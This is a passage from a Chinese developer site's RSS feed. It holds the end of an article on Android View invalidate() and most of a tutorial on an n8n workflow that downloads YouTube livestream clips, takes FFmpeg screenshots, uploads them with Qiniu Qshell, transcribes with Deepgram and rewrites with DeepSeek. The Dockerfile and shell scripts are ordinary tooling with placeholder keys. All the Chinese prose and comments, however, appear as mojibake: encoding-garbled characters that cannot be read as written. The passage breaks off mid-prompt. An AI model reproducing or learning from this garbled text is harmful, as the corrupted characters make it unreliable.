        invalidate() <span class="hljs-comment">// æ ‡è®°Viewé‡ç»˜ï¼Œè§¦å‘é‡ç»˜</span>
    }
}
</code></pre>
<p>åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œè°ƒç”¨ <code>increaseRadius()</code> æ–¹æ³•åï¼Œåœ†å½¢åŠå¾„å¢å¤§ï¼Œ<code>invalidate()</code> ä¼šæ ‡è®° <code>View</code> ä¸ºé‡ç»˜ï¼Œç³»ç»Ÿåœ¨ä¸‹ä¸€å¸§ä¼šè°ƒç”¨ <code>onDraw()</code> æ–¹æ³•ï¼Œç»˜åˆ¶æ›´æ–°åçš„åœ†å½¢ã€‚</p>
<h3 data-id="heading-48">æœ€ä½³å®è·µ</h3>
<ul>
<li><strong>å±€éƒ¨æ›´æ–°ä¼˜å…ˆä½¿ç”¨ invalidate(Rect dirty)</strong>ï¼šä»…å½“ <code>View</code> çš„ç‰¹å®šåŒºåŸŸå‘ç”Ÿå˜åŒ–æ—¶ï¼ˆå¦‚æ–‡æœ¬å†…å®¹æ›´æ–°ã€å±€éƒ¨é¢œè‰²å˜åŒ–ï¼‰ï¼Œä½¿ç”¨è¯¥æ–¹æ³•æŒ‡å®šé‡ç»˜åŒºåŸŸï¼Œé¿å…å…¨åŒºåŸŸé‡ç»˜é€ æˆçš„æ€§èƒ½æµªè´¹ï¼›</li>
<li><strong>é¿å…é¢‘ç¹/ä¸å¿…è¦çš„ invalidate() è°ƒç”¨</strong>ï¼šåœ¨åŠ¨ç”»å¾ªç¯æˆ–é«˜é¢‘æ•°æ®åˆ·æ–°åœºæ™¯ä¸­ï¼Œè¿‡åº¦è°ƒç”¨ <code>invalidate()</code> ä¼šå¯¼è‡´ç»˜åˆ¶å‹åŠ›è¿‡å¤§ï¼Œå¼•å‘æ€§èƒ½ç“¶é¢ˆï¼Œéœ€åˆç†æ§åˆ¶è°ƒç”¨é¢‘ç‡ï¼›</li>
<li><strong>é UI çº¿ç¨‹å¿…é¡»ä½¿ç”¨ postInvalidate()</strong>ï¼šAndroid è¦æ±‚æ‰€æœ‰ UI æ“ä½œï¼ˆåŒ…æ‹¬é‡ç»˜ï¼‰å¿…é¡»åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œï¼Œå› æ­¤åœ¨åå°çº¿ç¨‹ï¼ˆå¦‚ç½‘ç»œè¯·æ±‚çº¿ç¨‹ã€å­çº¿ç¨‹ï¼‰ä¸­éœ€é€šè¿‡ <code>postInvalidate()</code> å‘èµ·é‡ç»˜è¯·æ±‚ï¼Œç¡®ä¿çº¿ç¨‹å®‰å…¨ã€‚</li>
</ul>
<h3 data-id="heading-49">æ€»ç»“</h3>
<p>é‡ç»˜æ˜¯ Android æ¸²æŸ“æµæ°´çº¿ä¸­çš„å…³é”®æ¦‚å¿µï¼Œæ˜¯ UI æ›´æ–°èƒ½å¤Ÿç›´è§‚å‘ˆç°çš„æ ¸å¿ƒä¿éšœã€‚é€šè¿‡ <code>invalidate()</code>ã€<code>invalidate(Rect dirty)</code> æˆ– <code>postInvalidate()</code> ç­‰æ–¹æ³•ï¼Œå¼€å‘è€…å¯é«˜æ•ˆåˆ·æ–° <code>View</code>ï¼ŒåŒæ—¶ä¿æŒåº”ç”¨çš„æµç•…æ€§èƒ½ã€‚åˆç†è¿ç”¨é‡ç»˜æœºåˆ¶ï¼Œèƒ½æœ‰æ•ˆå‡å°‘ä¸å¿…è¦çš„é‡ç»˜æ“ä½œï¼Œæ‰“é€ æ›´ä¼˜åŒ–ã€å“åº”æ›´è¿…é€Ÿçš„åº”ç”¨ä½“éªŒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç»§ç»­AIç¼–æ’å®æˆ˜ï¼šå¸¦æˆªå›¾çš„è¿éº¦åˆ‡ç‰‡æ–‡ç« ç”Ÿæˆ]]></title>    <link>https://juejin.cn/post/7595115707160576041</link>    <guid>https://juejin.cn/post/7595115707160576041</guid>    <pubDate>2026-01-15T00:26:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595115707160576041" data-draft-id="7595115707160559657" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç»§ç»­AIç¼–æ’å®æˆ˜ï¼šå¸¦æˆªå›¾çš„è¿éº¦åˆ‡ç‰‡æ–‡ç« ç”Ÿæˆ"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-15T00:26:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‘¸é±¼çš„æ˜¥å“¥"/> <meta itemprop="url" content="https://juejin.cn/user/1714893870865303"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç»§ç»­AIç¼–æ’å®æˆ˜ï¼šå¸¦æˆªå›¾çš„è¿éº¦åˆ‡ç‰‡æ–‡ç« ç”Ÿæˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1714893870865303/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‘¸é±¼çš„æ˜¥å“¥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T00:26:23.000Z" title="Thu Jan 15 2026 00:26:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;font-weight:400;line-height:2;font-size:17px;overflow-x:hidden;color:#000}.markdown-body strong{padding:1px;color:#ee3f4d}.markdown-body em{padding:0 2px;color:#f33b1f}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:30px;margin-bottom:20px;line-height:1.5;font-weight:700}.markdown-body h1{text-align:center;padding-bottom:5px;font-size:32px;color:#ac1f18}.markdown-body h1:after{content:"";display:block;margin:4px auto 0;width:100px;height:2px;border-bottom:2px solid #f33b1f}.markdown-body h2{font-size:28px;border-bottom:1px solid #f33b1f}.markdown-body h2:before{content:"# "!important;color:#f33b1f}.markdown-body h3{font-size:24px;padding-left:9px;border-left:6px solid #f33b1f}.markdown-body h4{font-size:20px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #bbb;margin:16px 0}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:#f9f1db;color:#ee2746;border-radius:2px;font-size:16px;padding:1px 2px}.markdown-body code,.markdown-body pre{font-family:-apple-system,-apple-system-body,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,PingFang SC,æ€æºé»‘ä½“ CN,æ€æºé»‘ä½“,JetBrains Mono,Fira Code,Menlo,Ubuntu Mono,Consolas,sans-serif}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{margin:12px 0!important;border-radius:3px;font-size:15px;padding:16px 12px;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f7f7f7}.markdown-body a{text-decoration:none;color:#1781b5;padding:0 2px;border-bottom:1px solid #1781b5}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #f33b1f;color:#ac1f18}.markdown-body blockquote{color:#3d3d3d;background-color:#fff9f9;padding:6px 16px;margin:16px 0;border-left:3px solid #f07c82}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:6px 0}.markdown-body ol,.markdown-body ul{padding-left:30px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:6px}.markdown-body ol li{padding-left:6px}.markdown-body ::marker{color:#f33b1f}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body .task-list-item input[type=checkbox]{position:relative}.markdown-body .task-list-item input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background:#fff;border:1px solid #f07c82;border-radius:3px;box-sizing:border-box;z-index:1}.markdown-body .task-list-item input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-5px;left:0;right:0;bottom:0;width:0;height:0;color:#f33b1f;font-size:16px;font-weight:700;z-index:2}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border-spacing:0;border-collapse:collapse}.markdown-body table thead{background:#fff9f9;color:#000;text-align:left;font-size:15px}.markdown-body table tr:nth-child(2n){background-color:#fcfcfc}.markdown-body table tr:hover{background-color:#fff9f9}.markdown-body table td,.markdown-body table th{padding:12px 7px;line-height:24px;border:1px solid #f9f1db}.markdown-body table td{min-width:120px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><p>ç›¸æ¯”äºå‰é¢çš„å•çº¯é€šè¿‡å£°éŸ³æ´—æ–°é—»ç¨¿ä»¶çš„æ–‡å­—å†…å®¹ï¼Œæœ¬æ¬¡æˆ‘ä»¬æå‡äº†ä¸€å®šçš„éš¾åº¦ï¼Œé¢å‘è¿éº¦åˆ‡ç‰‡åœºæ™¯ã€‚</p>
<blockquote>
<p>ä½ æ€ä¹ˆçŸ¥é“æˆ‘å–œæ¬¢çœ‹å¬å‹‡å“¥å’Œå¤§å†°çš„è¿éº¦ï¼Ÿ</p>
</blockquote>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬è¦å¤„ç†çš„æ ¸å¿ƒéš¾ç‚¹åŒ…æ‹¬ï¼š</p>
<ol>
<li>åŒºåˆ†ä¸åŒçš„å‘è¨€äºº</li>
<li>æœ€å¥½èƒ½é…ä¸€äº›è¿éº¦æˆªå›¾åˆ°æ–‡ç« é‡Œ</li>
</ol>
<p>å…ˆçœ‹çœ‹æˆå“æ•ˆæœï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e8b778381af448c9531c307acc1ab8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pG46bG855qE5pil5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769041582&amp;x-signature=hsMFjhPh%2BjLixQwzZZTEwrNE8sc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">1. æ¶æ„æ€»è§ˆ</h2>
<p>è¿™å¥—å·¥ä½œæµé€šè¿‡ å¹¶è¡Œå¤„ç† æå¤§æé«˜äº†æ•ˆç‡ï¼š</p>
<ul>
<li>
<p>è¾“å…¥ç«¯ï¼šæ”¯æŒ YouTube URL ä¸‹è½½æˆ–æœ¬åœ°è§†é¢‘æ–‡ä»¶ã€‚</p>
</li>
<li>
<p>éŸ³é¢‘çº¿ï¼šæå–éŸ³é¢‘ -&gt; Deepgram (è¯­éŸ³è½¬æ–‡å­— + è§’è‰²åˆ†ç¦») -&gt; æ–‡æœ¬æ¸…æ´—ã€‚</p>
</li>
<li>
<p>è§†é¢‘çº¿ï¼šæ™ºèƒ½æˆªå›¾ (FFmpeg) -&gt; Qshell (ä¸Šä¼ ä¸ƒç‰›äº‘) -&gt; ç”Ÿæˆå›¾ç‰‡é“¾æ¥ã€‚</p>
</li>
<li>
<p>æ±‡èšç«¯ï¼šæ–‡æœ¬ + å›¾ç‰‡é“¾æ¥ -&gt; DeepSeek (AI æ·±åº¦æ”¹å†™ä¸æ’ç‰ˆ) -&gt; æœ¬åœ° Markdown æ–‡ä»¶ã€‚</p>
</li>
</ul>
<h2 data-id="heading-1">2. ç¯å¢ƒå‡†å¤‡</h2>
<p>å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰çš„æ–‡ç« ï¼ŒåŸºäºnode 16æ„å»ºä¸€ä¸ª debian é•œåƒï¼Œå¹¶å†…ç½® <code>yt-dlp</code> å’Œ <code>FFmpeg</code>ã€‚
é™¤æ­¤ä¹‹å¤–ï¼Œéœ€è¦å®‰è£…ä¸€ä¸ª <code>OSS</code> å·¥å…·ï¼Œå› ä¸ºæˆ‘ç”¨çš„ä¸ƒç‰›äº‘ï¼Œæ‰€ä»¥æ˜¯ <code>Qshell</code>ï¼Œè¿™ä¸ªæ ¹æ®è‡ªå·±çš„æƒ…å†µå®šåˆ¶å°±è¡Œã€‚</p>
<p>ä»¥ä¸‹æ˜¯æˆ‘çš„ <code>Dockerfile</code>ï¼Œä»…ä¾›å‚è€ƒå§ï¼š</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">FROM node:20-bookworm

# 1. æ¥æ”¶æ„å»ºå‚æ•°
ARG HTTP_PROXY
ARG HTTPS_PROXY

USER root

# 2. ã€ç³»ç»Ÿå±‚ä»£ç†ã€‘
ENV http_proxy=${HTTP_PROXY}
ENV https_proxy=${HTTPS_PROXY}

# å®‰è£…ç³»ç»Ÿå·¥å…· (Debianç¯å¢ƒ)
# å¢åŠ äº† unzipï¼Œè™½ç„¶ tar ä¹Ÿå¯ä»¥ï¼Œä½† unzip å¤„ç†æŸäº› zip åŒ…æ›´æ–¹ä¾¿ï¼Œä¸è¿‡ qshell æ˜¯ tar.gzï¼Œè¿™é‡Œåªç”¨ tar å³å¯
RUN apt-get update &amp;&amp; \
    apt-get install -y python3 python3-pip ffmpeg wget &amp;&amp; \
    rm -rf /var/lib/apt/lists/*

# -------------------------------------------------------
# 2.5 å®‰è£…å·¥å…·é›†ï¼šyt-dlp å’Œ Qshell (ä¸ƒç‰›å‘½ä»¤è¡Œ)
# -------------------------------------------------------
# å®‰è£… yt-dlp
RUN wget https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -O /usr/local/bin/yt-dlp &amp;&amp; \
    chmod a+rx /usr/local/bin/yt-dlp

# å®‰è£… Qshell (æ·»åŠ åˆ°è¿™é‡Œ)
# Qshell v2.13.0 æ˜¯ç›®å‰æ¯”è¾ƒç¨³å®šçš„ç‰ˆæœ¬
RUN wget https://devtools.qiniu.com/qshell-v2.13.0-linux-amd64.tar.gz -O /tmp/qshell.tar.gz &amp;&amp; \
    tar -zxvf /tmp/qshell.tar.gz -C /tmp &amp;&amp; \
    # æ³¨æ„ï¼šè§£å‹åçš„æ–‡ä»¶å¤¹åç§°é€šå¸¸åŒ…å«ç‰ˆæœ¬å·ï¼Œç§»åŠ¨å¹¶é‡å‘½åä¸º qshell
    mv /tmp/qshell /usr/local/bin/qshell &amp;&amp; \
    chmod +x /usr/local/bin/qshell &amp;&amp; \
    rm /tmp/qshell.tar.gz
# -------------------------------------------------------

# 3. ã€NPM å±‚ä»£ç†ã€‘å®‰è£… n8n
RUN npm config set proxy ${HTTP_PROXY} &amp;&amp; \
    npm config set https-proxy ${HTTPS_PROXY} &amp;&amp; \
    npm install -g n8n &amp;&amp; \
    npm config delete proxy &amp;&amp; \
    npm config delete https-proxy

# 4. æƒé™ä¸æ¸…ç†
RUN mkdir -p /home/node/.n8n /files &amp;&amp; \
    chown -R node:node /home/node/.n8n /files

# æ¸…ç†ç¯å¢ƒå˜é‡
ENV http_proxy=""
ENV https_proxy=""

USER node
ENTRYPOINT ["n8n"]
</code></pre>
<p><strong>å¯åŠ¨å‘½ä»¤ (åœ¨ docker-compose.yml æ‰€åœ¨ç›®å½•):</strong></p>
<pre><code class="hljs language-bash" lang="bash">docker-compose up -d --build
</code></pre>
<hr/>
<h2 data-id="heading-2">3. æ ¸å¿ƒèŠ‚ç‚¹é…ç½®è¯¦è§£</h2>
<p>çœ‹çœ‹èŠ‚ç‚¹å¸ƒç½®å§ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d9127fb06644627b7b3e61d6cdaa224~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pG46bG855qE5pil5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769041582&amp;x-signature=LFRwMB6Gp0mF2HECWkEZlvee5PQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">3.1 æˆªå›¾èŠ‚ç‚¹ (Execute Command)</h3>
<p>é¦–å…ˆæ˜¯æˆªå›¾ï¼Œç›¸æ¯”äºæ–°é—»ç±»çš„è§†é¢‘ï¼Œè¿éº¦è§†é¢‘å¯¹äºæˆªå›¾çš„ç²¾å‡†æ€§è¦æ±‚ä½å¾ˆå¤šã€‚</p>
<p>ä»¥â€œå¤§å†°â€çš„è¿éº¦è§†é¢‘ä¸ºä¾‹ï¼Œåæ­£æˆªæ¥æˆªå»å°±æ˜¯å¤§å†°ä¸€å¼ ç˜¦è„¸æ€¼åœ¨å“ªé‡Œï¼Œæ‰€ä»¥å•¥æ—¶å€™æˆªå›¾é—®é¢˜ä¸å¤§ï¼Œå…³é”®æœ‰å›¾æ•ˆæœå°±ä¼šå¥½å¾ˆå¤šã€‚</p>
<p>ä¸ä½¿ç”¨å›ºå®šç§’æ•°ï¼Œè€Œæ˜¯åŸºäºè§†é¢‘æ—¶é•¿çš„ <strong>33%</strong> å’Œ <strong>66%</strong> å¤„æˆªå›¾ï¼Œå¹¶åŠ ä¸Š <strong>æ—¥æœŸæ—¶é—´æˆ³</strong> é˜²æ­¢æ–‡ä»¶åå†²çªã€‚</p>
<ul>
<li><strong>Command Shell è„šæœ¬:</strong></li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/sh</span>

<span class="hljs-comment"># ---------------- é…ç½®åŒºåŸŸ ----------------</span>
VIDEO_PATH=<span class="hljs-string">"{{ <span class="hljs-variable">$json</span>.full_path }}"</span>
FOLDER_NAME=<span class="hljs-string">"{{ <span class="hljs-variable">$json</span>.clean_name }}"</span>

<span class="hljs-comment"># 1. ç¡®å®šè¾“å‡ºç›®å½•</span>
PARENT_DIR=$(<span class="hljs-built_in">dirname</span> <span class="hljs-string">"<span class="hljs-variable">$VIDEO_PATH</span>"</span>)
OUTPUT_DIR=<span class="hljs-string">"<span class="hljs-variable">$PARENT_DIR</span>/<span class="hljs-variable">$FOLDER_NAME</span>"</span>
<span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_DIR</span>"</span>

<span class="hljs-comment"># 2. è·å–è§†é¢‘æ—¶é•¿ &amp; è®¡ç®—åˆ‡å…¥ç‚¹</span>
DURATION=$(ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 <span class="hljs-string">"<span class="hljs-variable">$VIDEO_PATH</span>"</span>)
T1=$(awk <span class="hljs-string">"BEGIN {print <span class="hljs-variable">$DURATION</span> * 0.33}"</span>)
T2=$(awk <span class="hljs-string">"BEGIN {print <span class="hljs-variable">$DURATION</span> * 0.66}"</span>)

<span class="hljs-comment"># 3. ç”Ÿæˆå½“å‰ç³»ç»Ÿæ—¶é—´æˆ³ (é˜²æ­¢æ–‡ä»¶åé‡å¤)</span>
<span class="hljs-comment"># æ ¼å¼: 20250114-103005</span>
NOW_STR=$(<span class="hljs-built_in">date</span> +<span class="hljs-string">"%Y%m%d-%H%M%S"</span>)

<span class="hljs-comment"># 4. å®šä¹‰æ–‡ä»¶å (å¸¦ä¸Šåºå·)</span>
IMG1=<span class="hljs-string">"<span class="hljs-variable">$OUTPUT_DIR</span>/<span class="hljs-variable">${NOW_STR}</span>-1.jpg"</span>
IMG2=<span class="hljs-string">"<span class="hljs-variable">$OUTPUT_DIR</span>/<span class="hljs-variable">${NOW_STR}</span>-2.jpg"</span>

<span class="hljs-comment"># 5. æ‰§è¡Œæé€Ÿæˆªå›¾ (-ss æ”¾åœ¨ -i ä¹‹å‰)</span>
ffmpeg -ss <span class="hljs-string">"<span class="hljs-variable">$T1</span>"</span> -i <span class="hljs-string">"<span class="hljs-variable">$VIDEO_PATH</span>"</span> -frames:v 1 -q:v 2 -y <span class="hljs-string">"<span class="hljs-variable">$IMG1</span>"</span> &gt; /dev/null 2&gt;&amp;1
ffmpeg -ss <span class="hljs-string">"<span class="hljs-variable">$T2</span>"</span> -i <span class="hljs-string">"<span class="hljs-variable">$VIDEO_PATH</span>"</span> -frames:v 1 -q:v 2 -y <span class="hljs-string">"<span class="hljs-variable">$IMG2</span>"</span> &gt; /dev/null 2&gt;&amp;1

<span class="hljs-comment"># 6. è¾“å‡º JSON ç»™åç»­èŠ‚ç‚¹</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"{\"img1_path\": \"<span class="hljs-variable">$IMG1</span>\", \"img2_path\": \"<span class="hljs-variable">$IMG2</span>\", \"folder_path\": \"<span class="hljs-variable">$OUTPUT_DIR</span>\", \"clean_name\": \"<span class="hljs-variable">$FOLDER_NAME</span>\"}"</span>
</code></pre>
<h3 data-id="heading-4">3.2 ä¸Šä¼ èŠ‚ç‚¹ (Execute Command - Qshell)</h3>
<p>ç›´æ¥è°ƒç”¨ä¸ƒç‰›äº‘ CLI ä¸Šä¼ æ–‡ä»¶å¤¹ï¼Œæ¯” n8n åŸç”Ÿ S3 èŠ‚ç‚¹æ›´ç¨³å®šã€‚</p>
<ul>
<li><strong>Command Shell è„šæœ¬:</strong></li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/sh</span>

<span class="hljs-comment"># -------- é…ç½®åŒºåŸŸ --------</span>
AK=<span class="hljs-string">"ä½ çš„AccessKey"</span>
SK=<span class="hljs-string">"ä½ çš„SecretKey"</span>
BUCKET=<span class="hljs-string">"ä½ çš„å­˜å‚¨æ¡¶åç§°"</span>
DOMAIN=<span class="hljs-string">"https://ä½ çš„åŸŸå"</span> <span class="hljs-comment"># æ³¨æ„ï¼šæœ«å°¾ä¸è¦å¸¦æ–œæ </span>
<span class="hljs-comment"># -------------------------</span>

LOCAL_FOLDER=<span class="hljs-string">"{{ JSON.parse(<span class="hljs-variable">$json</span>.stdout).folder_path }}"</span>

<span class="hljs-comment"># 1. ç™»å½•ä¸ƒç‰› (æ¸…ç†æ—§é…ç½®ä»¥é˜²æŠ¥é”™)</span>
<span class="hljs-built_in">rm</span> -rf ~/.qshell/account.db &gt; /dev/null 2&gt;&amp;1
qshell account <span class="hljs-string">"<span class="hljs-variable">$AK</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$SK</span>"</span> default

<span class="hljs-comment"># 2. éå†ä¸Šä¼ å¹¶ç”Ÿæˆé“¾æ¥</span>
IMG_URLS=<span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">$LOCAL_FOLDER</span>"</span>/*.jpg; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> ]; <span class="hljs-keyword">then</span>
        FILENAME=$(<span class="hljs-built_in">basename</span> <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span>)
        <span class="hljs-comment"># æ„é€ äº‘ç«¯è·¯å¾„: pic/n8n/æ–‡ä»¶å¤¹å/æ–‡ä»¶å</span>
        KEY=<span class="hljs-string">"pic/n8n/{{ JSON.parse(<span class="hljs-variable">$json</span>.stdout).clean_name }}/<span class="hljs-variable">$FILENAME</span>"</span>
        
        qshell fput <span class="hljs-string">"<span class="hljs-variable">$BUCKET</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$KEY</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> --overwrite &gt; /dev/null 2&gt;&amp;1
        IMG_URLS=<span class="hljs-string">"<span class="hljs-variable">$IMG_URLS</span> <span class="hljs-variable">$DOMAIN</span>/<span class="hljs-variable">$KEY</span>"</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># 3. è¾“å‡º URL åˆ—è¡¨</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$IMG_URLS</span>"</span>
</code></pre>
<h3 data-id="heading-5">3.3 éŸ³é¢‘å¤„ç† (Deepgram)</h3>
<p><code>Deepgram</code> æ˜¯ç›®å‰æœ€å¼ºçš„å£°éŸ³å¤„ç†AIå‚å•†ï¼Œå…³é”®è¿˜èƒ½ç™½å«–200åˆ€çš„é¢åº¦ã€‚æ¯”å¦‚è¯´è¿éº¦åœºæ™¯ï¼Œå®ƒå¯ä»¥è½»æ¾åˆ†è¾¨å‡ºä¸åŒå‘è¨€äººçš„å£°éŸ³ã€‚</p>
<p>è¿™å¯¹æˆ‘ä»¬çš„åœºæ™¯æ¥è¯´éå¸¸å…³é”®ã€‚</p>
<ul>
<li><strong>Method</strong>: POST</li>
<li><strong>URL</strong>: <code>https://api.deepgram.com/v1/listen?model=nova-2&amp;language=zh&amp;diarize=true</code></li>
<li><strong>å…³é”®ç‚¹</strong>: å¿…é¡»å¼€å¯ <code>diarize=true</code> æ‰èƒ½åŒºåˆ†ä¸åŒè¯´è¯äººã€‚</li>
</ul>
<h3 data-id="heading-6">3.4 æ•°æ®æ±‡èš (Merge Node - <strong>å…³é”®</strong>)</h3>
<p>ä¸ºäº†è®© DeepSeek åŒæ—¶æ‹¿åˆ°â€œæ–‡æœ¬â€å’Œâ€œå›¾ç‰‡â€ï¼Œå¿…é¡»æ­£ç¡®è®¾ç½® Merge èŠ‚ç‚¹ã€‚</p>
<ul>
<li><strong>Mode (æ¨¡å¼)</strong>: <code>Combine</code> (åˆå¹¶)</li>
<li><strong>Combine By (åˆå¹¶æ–¹å¼)</strong>: <code>Merge By Position</code> (æŒ‰ä½ç½®åˆå¹¶)</li>
<li><strong>æ•ˆæœ</strong>: å°†ä¸Šæ¸¸ä¸¤æ¡çº¿çš„æ•°æ®åˆå¹¶ä¸ºåŒä¸€ä¸ª JSON å¯¹è±¡ã€‚</li>
</ul>
<h3 data-id="heading-7">3.5 AI å†™ä½œ (DeepSeek Chat Model)</h3>
<p>è¿™æ˜¯èµ‹äºˆæ–‡ç« çµé­‚çš„ä¸€æ­¥ã€‚</p>
<ul>
<li><strong>System Prompt</strong>: è®¾å®šä¸ºèµ„æ·±ç§‘æŠ€ä¸»ç¬”ã€‚</li>
<li><strong>User Prompt (Expression æ¨¡å¼)</strong>:</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript">ã€å¯¹è¯ç´ æã€‘
